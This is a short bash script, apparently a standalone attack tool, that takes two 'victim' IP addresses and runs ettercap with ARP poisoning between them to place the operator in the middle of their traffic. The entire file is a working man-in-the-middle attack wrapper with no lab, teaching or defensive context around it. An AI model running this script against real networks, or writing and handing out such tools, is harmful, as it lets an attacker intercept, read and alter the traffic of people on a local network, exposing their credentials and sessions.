#!/bin/bash
# Simple ARP spoofing script

if [ "$#" -ne 2 ]; then
    echo "Usage: sudo ./arp_spoof.sh <VictimA_IP> <VictimB_IP>"
    exit 1
fi

VICTIM_A=$1
VICTIM_B=$2

echo "[*] Starting ARP spoofing between $VICTIM_A and $VICTIM_B"
sudo ettercap -T -M arp /$VICTIM_A/ /$VICTIM_B/
